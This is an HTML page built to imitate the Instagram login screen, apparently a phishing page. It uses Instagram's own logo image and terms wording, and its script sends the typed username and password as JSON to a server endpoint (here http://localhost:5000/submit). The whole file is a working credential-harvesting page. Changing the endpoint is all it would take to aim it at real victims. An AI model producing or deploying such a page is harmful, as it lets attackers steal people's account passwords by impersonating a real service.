<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        /* Basic styling to make it look like Instagram */
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            /* background-color: #fafafa; */
        }
        .login-container {
            width: 100%;
            max-width: 350px;
            background-color: #fff;
            padding: 20px;
            text-align: center;
        }
        .login-container img {
            margin: 20px 0;
            width: 175px;
        }
        .login-container input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            box-sizing: border-box;
            font-size: 14px;
        }
        #loginForm{
            display: flex;
            flex-direction: column;
            margin: 20px 0;
        }
        i{
            margin-bottom: 50px;
        }
        #fb{
            background-color: rgb(34, 123, 240);
            margin: 20px 0;
            padding: 15px 0;
        }
        #forgotPass{
            text-decoration: none;
            text-align: end;
            margin: 8px 0;
            color: #0095f6;
        }
        #donthaveaccount{
            color: #837c7c;
        }
        .signup{
            text-decoration: none;
            color: #0095f6;
            font-weight: bold;
        }

        #lastLine{
            color: #837c7c;
            margin: 50px 0;
            line-height: 25px;
        }
        .bold{
            color: black;
            font-weight: 700;
        }
        #login{
            margin: 20px 0;
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
        }
        .login-container button:disabled {
            background-color: #b2dffc;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yv/r/KoLLpWDb4f6.png&quot;); background-position: 0px -52px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>

        <form id="loginForm">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <a id="forgotPass" href="#">Forgot password?</a>
            <button id="login" type="submit">Log In</button>
        </form>

        <p id="donthaveaccount">Don't have an account? <a href="#" class="signup">Sign up</a></p>
        
        <p id="lastLine" >By continuing, you agree to Instagram's <b class="bold">Terms of Use</b> and <b class="bold">Privacy Policy</b></p>
    
    </div>
    <script>
        // JavaScript to handle form submission
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault();

            const formData = new FormData(event.target);
            const data = {
                username: formData.get('username'),
                password: formData.get('password')
            };

            try {
                const response = await fetch('http://localhost:5000/submit', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });

                const result = await response.text();
                alert(result);
            } catch (error) {
                console.error('Error submitting form:', error);
            }
        });
    </script>
</body>
